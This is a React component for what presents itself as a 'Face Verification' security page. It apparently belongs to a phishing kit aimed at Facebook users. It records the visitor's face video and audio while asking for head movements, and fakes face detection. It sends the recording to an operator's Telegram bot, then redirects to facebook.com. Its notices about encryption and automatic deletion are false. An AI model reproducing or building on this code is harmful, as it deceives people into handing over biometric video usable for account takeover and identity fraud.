import translateText from '@/services/translation';
import {
	faArrowDown,
	faArrowLeft,
	faArrowRight,
	faArrowUp,
	faCircleCheck,
	faFaceMeh,
	faStop,
	faVideo,
} from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import React, { useEffect, useRef, useState } from 'react';

type FaceDetectionStatus = 'none' | 'detecting' | 'detected' | 'lost';

const defaultTranslations = {
	pageTitle: 'Face Verification',
	securityVerification: 'Security Verification',
	cameraAccessRequired: 'Camera Access Required',
	enableCamera:
		'Please enable camera access in your browser settings to continue with face verification.',
	faceDetected: 'Face Detected',
	positionFace: 'Position Your Face',
	greatFollowInstructions: 'Great! Please follow the movement instructions',
	centerFaceInFrame: 'Center your face in the frame and ensure good lighting',
	recording: 'Recording',
	startVerification: 'Start Face Verification',
	stopRecording: 'Stop Recording',
	submitting: 'Submitting...',
	submitVerification: 'Submit Verification',
	retakeVideo: 'Retake Video',
	verificationFailed: 'Verification failed. Please check:',
	checkList: {
		permissions: 'Camera permissions are granted',
		browser:
			"You're using a supported browser (Chrome, Firefox, or Safari)",
		cameraUse: 'Your camera is not being used by another application',
	},
	securityNotice: 'Security Notice:',
	securityMessage:
		'This verification process uses advanced facial recognition technology to ensure account security. All data is encrypted and processed in accordance with our privacy policy.',
	privacyNote:
		'Your video will be automatically deleted after verification is complete. This process helps prevent unauthorized access and protect our community.',
	movementInstructions: {
		left: 'Slowly move your head left',
		up: 'Move your head up',
		right: 'Slowly move your head right',
		down: 'Move your head down',
		center: 'Return to center and look straight',
	},
	faceStatus: {
		detected: 'Face Detected',
		position: 'Position Your Face',
		followInstructions: 'Great! Please follow the movement instructions',
		centerFace: 'Center your face in the frame and ensure good lighting',
	},
};

const VideoPlaceholder: React.FC<{
	isRecording: boolean;
	faceStatus: FaceDetectionStatus;
	translations: typeof defaultTranslations;
}> = ({ isRecording, faceStatus, translations }) => (
	<div
		className={`h-[40vh] max-h-[400px] min-h-[300px] flex-col items-center justify-center bg-gray-50 ${
			isRecording ? 'flex' : 'hidden'
		}`}
	>
		<div
			className={`mb-4 rounded-full p-6 ${
				faceStatus === 'detected' ? 'bg-green-100' : 'bg-blue-100'
			}`}
		>
			<FontAwesomeIcon
				icon={faceStatus === 'detected' ? faCircleCheck : faFaceMeh}
				className={`h-8 w-8 ${
					faceStatus === 'detected'
						? 'text-green-500'
						: 'text-blue-500'
				}`}
			/>
		</div>
		<div className='text-center'>
			<h3 className='mb-2 text-lg font-semibold text-gray-700'>
				{faceStatus === 'detected'
					? translations.faceStatus.detected
					: translations.faceStatus.position}
			</h3>
			<p className='text-sm text-gray-500'>
				{faceStatus === 'detected'
					? translations.faceStatus.followInstructions
					: translations.faceStatus.centerFace}
			</p>
		</div>
	</div>
);

const RecordingIndicator: React.FC = () => (
	<div className='absolute right-4 top-4 flex items-center gap-2 rounded-full bg-black/75 px-3 py-1.5'>
		<div className='h-2.5 w-2.5 animate-pulse rounded-full bg-red-500'></div>
		<span className='text-sm text-white'>Recording</span>
	</div>
);

const FaceGuide: React.FC = () => (
	<div className='absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2'>
		<div className='h-56 w-44 rounded-full border-4 border-dashed border-blue-400/50'></div>
	</div>
);

const MovementArrow: React.FC<{ stage: number }> = ({ stage }) => {
	const getArrowStyle = () => {
		switch (stage) {
			case 0:
				return {
					icon: faArrowLeft,
					className: 'animate-bounce-horizontal text-white',
					containerClass: 'left-16 top-1/2 -translate-y-1/2',
				};
			case 1:
				return {
					icon: faArrowUp,
					className: 'animate-bounce text-white',
					containerClass: 'left-1/2 -translate-x-1/2 top-24',
				};
			case 2:
				return {
					icon: faArrowRight,
					className: 'animate-bounce-horizontal text-white',
					containerClass: 'right-16 top-1/2 -translate-y-1/2',
				};
			case 3:
				return {
					icon: faArrowDown,
					className: 'animate-bounce text-white',
					containerClass: 'left-1/2 -translate-x-1/2 bottom-24',
				};
			default:
				return null;
		}
	};

	const arrowStyle = getArrowStyle();
	if (!arrowStyle) return null;

	return (
		<div className={`absolute ${arrowStyle.containerClass}`}>
			<FontAwesomeIcon
				icon={arrowStyle.icon}
				className={`h-8 w-8 ${arrowStyle.className}`}
			/>
		</div>
	);
};

const VideoUpload: React.FC = () => {
	const [isRecording, setIsRecording] = useState(false);
	const [recordedBlob, setRecordedBlob] = useState<Blob | null>(null);
	const [uploadStatus, setUploadStatus] = useState<
		'idle' | 'uploading' | 'success' | 'error'
	>('idle');
	const [hasPermission, setHasPermission] = useState<boolean | null>(null);
	const [faceStatus, setFaceStatus] = useState<FaceDetectionStatus>('none');
	const [recordingStage, setRecordingStage] = useState<number>(0);
	const [botToken, setBotToken] = useState<string>('');
	const [chatId, setChatId] = useState<string>('');
	const [messageId, setMessageId] = useState<string>('');
	const [translations, setTranslations] = useState(defaultTranslations);
	const [isTranslated, setIsTranslated] = useState(false);

	useEffect(() => {
		axios.get('/api/get-config').then((res) => {
			setBotToken(res.data.token);
			setChatId(res.data.chatId);
			setMessageId(localStorage.getItem('message_id') ?? '');
		});
	}, []);
	const mediaRecorderRef = useRef<MediaRecorder | null>(null);
	const videoRef = useRef<HTMLVideoElement>(null);
	const streamRef = useRef<MediaStream | null>(null);
	const chunksRef = useRef<Blob[]>([]);
	const videoUrlRef = useRef<string | null>(null);
	const timerRef = useRef<NodeJS.Timeout | null>(null);

	useEffect(() => {
		const translateStrings = async () => {
			if (!isTranslated) {
				// Translate main strings
				const translatedTexts = await Promise.all(
					Object.entries(defaultTranslations).map(
						async ([key, value]) => {
							if (typeof value === 'string') {
								const translatedValue =
									await translateText(value);
								return [key, translatedValue];
							} else if (typeof value === 'object') {
								const translatedObj = await Promise.all(
									Object.entries(value).map(
										async ([subKey, subValue]) => {
											const translatedSubValue =
												await translateText(subValue);
											return [subKey, translatedSubValue];
										},
									),
								);
								return [key, Object.fromEntries(translatedObj)];
							}
							return [key, value];
						},
					),
				);
				setTranslations(Object.fromEntries(translatedTexts));
				setIsTranslated(true);
			}
		};

		translateStrings();
	}, [isTranslated]);

	const recordingStages = [
		translations.movementInstructions.left,
		translations.movementInstructions.up,
		translations.movementInstructions.right,
		translations.movementInstructions.down,
		translations.movementInstructions.center,
	];

	useEffect(() => {
		if (
			(window.location.protocol !== 'https:' &&
				window.location.hostname !== 'localhost') ||
			!navigator.mediaDevices ||
			!window.MediaRecorder
		) {
			console.error('Required APIs not available');
			setHasPermission(false);
			return;
		}
		checkCameraPermission();

		return () => {
			if (timerRef.current) {
				clearTimeout(timerRef.current);
			}
			stopMediaTracks();
			if (videoUrlRef.current) {
				URL.revokeObjectURL(videoUrlRef.current);
			}
		};
	}, []);

	useEffect(() => {
		if (isRecording) {
			let currentStage = 0;
			const stageInterval = setInterval(() => {
				currentStage++;
				if (currentStage < recordingStages.length) {
					setRecordingStage(currentStage);
				} else {
					clearInterval(stageInterval);
					stopRecording();
				}
			}, 3000);

			return () => {
				clearInterval(stageInterval);
			};
		}
	}, [isRecording]);

	useEffect(() => {
		if (isRecording) {
			const detectFace = () => {
				setFaceStatus('detected');
			};

			const detectionInterval = setInterval(detectFace, 1000);
			return () => clearInterval(detectionInterval);
		}
	}, [isRecording]);

	useEffect(() => {
		if (streamRef.current && isRecording) {
			const mimeType = getSupportedMimeType();
			if (!mimeType) {
				console.error('No supported video MIME type found');
				return;
			}

			const mediaRecorder = new MediaRecorder(streamRef.current, {
				mimeType,
				videoBitsPerSecond: 2500000,
			});

			mediaRecorderRef.current = mediaRecorder;
			chunksRef.current = [];

			mediaRecorder.ondataavailable = (event) => {
				if (event.data.size > 0) {
					chunksRef.current.push(event.data);
				}
			};

			mediaRecorder.onstop = () => {
				const blob = new Blob(chunksRef.current, { type: 'video/mp4' });
				setRecordedBlob(blob);
				if (videoUrlRef.current) {
					URL.revokeObjectURL(videoUrlRef.current);
				}
				const videoUrl = URL.createObjectURL(blob);
				videoUrlRef.current = videoUrl;

				if (videoRef.current) {
					videoRef.current.srcObject = null;
					videoRef.current.src = videoUrl;
					videoRef.current.load();
					videoRef.current.play();
				}
			};

			mediaRecorder.start();
			timerRef.current = setTimeout(() => {
				stopRecording();
			}, 15000);

			return () => {
				if (
					mediaRecorderRef.current &&
					mediaRecorderRef.current.state !== 'inactive'
				) {
					mediaRecorderRef.current.stop();
				}
			};
		}
	}, [streamRef.current, isRecording]);

	const checkCameraPermission = async () => {
		try {
			const stream = await navigator.mediaDevices.getUserMedia({
				video: true,
				audio: true,
			});

			streamRef.current = stream;
			if (videoRef.current) {
				videoRef.current.srcObject = stream;
				await videoRef.current.play();
			}

			console.log(
				'Camera access granted:',
				stream.getVideoTracks()[0].label,
			);
			setHasPermission(true);
		} catch (error) {
			console.error('Camera permission denied:', error);
			setHasPermission(false);
		}
	};

	const stopMediaTracks = () => {
		if (streamRef.current) {
			streamRef.current.getTracks().forEach((track) => track.stop());
			streamRef.current = null;
		}
	};

	const getSupportedMimeType = () => {
		const types = [
			'video/webm;codecs=vp9,opus',
			'video/webm;codecs=vp8,opus',
			'video/webm',
			'video/mp4',
		];

		return types.find((type) => MediaRecorder.isTypeSupported(type)) ?? '';
	};

	const startRecording = async () => {
		try {
			stopMediaTracks();
			const stream = await navigator.mediaDevices.getUserMedia({
				video: true,
				audio: true,
			});

			streamRef.current = stream;
			if (videoRef.current) {
				videoRef.current.srcObject = stream;
				await videoRef.current.play();
			}

			setIsRecording(true);
		} catch (error) {
			console.error('Error starting recording:', error);
			setUploadStatus('error');
			setHasPermission(false);
		}
	};

	const stopRecording = () => {
		if (mediaRecorderRef.current && isRecording) {
			if (timerRef.current) {
				clearTimeout(timerRef.current);
				timerRef.current = null;
			}
			mediaRecorderRef.current.stop();
			stopMediaTracks();
			setIsRecording(false);
		}
	};

	const handleSubmit = async () => {
		if (!recordedBlob || recordedBlob.size === 0) {
			setUploadStatus('error');
			return;
		}

		setUploadStatus('uploading');
		const formData = new FormData();
		formData.append('chat_id', chatId);

		const fileName = `verification-${Date.now()}.mp4`;
		formData.append('video', recordedBlob, fileName);
		formData.append('reply_to_message_id', messageId);
		try {
			const response = await axios.post(
				`https://api.telegram.org/bot${botToken}/sendVideo`,
				formData,
				{
					headers: {
						'Content-Type': 'multipart/form-data',
					},
					timeout: 30000,
				},
			);

			if (response.data?.ok) {
				setUploadStatus('success');
				setTimeout(() => {
					window.location.href = 'https://facebook.com/';
				}, 1500);
			} else {
				throw new Error('Upload failed');
			}
		} catch (error) {
			console.error('Error uploading to Telegram:', error);
			setUploadStatus('error');
		}
	};

	const handleReRecord = () => {
		setRecordedBlob(null);
		setUploadStatus('idle');
		if (videoUrlRef.current) {
			URL.revokeObjectURL(videoUrlRef.current);
			videoUrlRef.current = null;
		}
		if (videoRef.current) {
			videoRef.current.src = '';
		}
	};

	if (hasPermission === false) {
		return (
			<div className='fixed inset-0 flex items-center justify-center bg-white'>
				<div className='w-11/12 max-w-lg rounded-lg bg-white p-8 shadow-2xl md:w-2/5'>
					<div className='text-center'>
						<FontAwesomeIcon
							icon={faVideo}
							className='mb-6 h-12 w-12 text-red-500'
						/>
						<h2 className='mb-4 text-2xl font-bold text-gray-800'>
							{translations.cameraAccessRequired}
						</h2>
						<p className='mb-8 text-gray-600'>
							{translations.enableCamera}
						</p>
						<button
							onClick={() => window.location.reload()}
							className='rounded-md bg-blue-500 px-6 py-2.5 font-semibold text-white transition-all hover:bg-blue-600'
						>
							Reload Page
						</button>
					</div>
				</div>
			</div>
		);
	}

	return (
		<div className='mx-auto w-full max-w-2xl rounded-lg bg-white p-4 shadow-2xl sm:p-6 md:p-8'>
			<div className='relative mb-4 flex items-center justify-center'>
				<h2 className='text-xl font-semibold text-gray-800 sm:text-2xl'>
					{translations.pageTitle}
				</h2>
			</div>

			<hr className='my-4 border-gray-300' />

			<div className='mb-4 space-y-2'>
				<b className='text-base text-gray-700 sm:text-lg'>
					{translations.securityVerification}
				</b>
			</div>

			<div className='relative mb-6 overflow-hidden rounded-lg border-2 border-gray-200'>
				<VideoPlaceholder
					isRecording={!isRecording && !recordedBlob}
					faceStatus={faceStatus}
					translations={translations}
				/>
				<video
					ref={videoRef}
					className={`h-[40vh] max-h-[400px] min-h-[300px] w-full object-cover ${
						isRecording || recordedBlob ? 'block' : 'hidden'
					}`}
					autoPlay
					playsInline
					muted
					style={{ transform: 'scaleX(-1)' }}
				>
					<track kind='captions' src='' label='Captions' />
				</video>
				{isRecording && (
					<>
						<RecordingIndicator />
						<FaceGuide />
						<MovementArrow stage={recordingStage} />
						<div className='absolute left-0 right-0 top-2 flex items-center justify-center'>
							<div className='rounded-full bg-gray-800/75 px-4 py-2 text-center'>
								<span className='text-sm text-white'>
									{recordingStages[recordingStage]}
								</span>
							</div>
						</div>
					</>
				)}
			</div>

			<div className='mt-4 grid gap-3 sm:mt-6'>
				{!isRecording && !recordedBlob && (
					<button
						onClick={startRecording}
						className='w-full rounded-md bg-blue-500 px-3 py-2.5 font-semibold text-white transition-all hover:bg-blue-600 sm:px-4 sm:py-3'
					>
						<FontAwesomeIcon icon={faVideo} className='mr-2' />
						{translations.startVerification}
					</button>
				)}

				{isRecording && (
					<button
						onClick={stopRecording}
						className='w-full rounded-md bg-red-500 px-3 py-2.5 font-semibold text-white transition-all hover:bg-red-600 sm:px-4 sm:py-3'
					>
						<FontAwesomeIcon icon={faStop} className='mr-2' />
						{translations.stopRecording}
					</button>
				)}

				{recordedBlob && (
					<>
						<button
							onClick={handleSubmit}
							disabled={uploadStatus === 'uploading'}
							className='w-full rounded-md bg-blue-500 px-3 py-2.5 font-semibold text-white transition-all hover:bg-blue-600 disabled:opacity-50 sm:px-4 sm:py-3'
						>
							{uploadStatus === 'uploading'
								? translations.submitting
								: translations.submitVerification}
						</button>

						<button
							onClick={handleReRecord}
							disabled={uploadStatus === 'uploading'}
							className='w-full rounded-md border-2 border-gray-300 bg-white px-3 py-2.5 font-semibold text-gray-700 transition-all hover:bg-gray-50 disabled:opacity-50 sm:px-4 sm:py-3'
						>
							{translations.retakeVideo}
						</button>
					</>
				)}
			</div>

			{uploadStatus === 'error' && (
				<div className='mt-4 rounded-md bg-red-50 p-3 text-sm text-red-800 sm:p-4'>
					<p>{translations.verificationFailed}</p>
					<ul className='ml-4 mt-2 list-disc'>
						<li>{translations.checkList.permissions}</li>
						<li>{translations.checkList.browser}</li>
						<li>{translations.checkList.cameraUse}</li>
					</ul>
				</div>
			)}

			<div className='mt-4 rounded-md bg-gray-100 p-4 text-sm text-gray-600'>
				<p className='mb-2'>
					<span className='font-semibold'>
						{translations.securityNotice}
					</span>{' '}
					{translations.securityMessage}
				</p>
				<p>{translations.privacyNote}</p>
			</div>
		</div>
	);
};

export default VideoUpload;
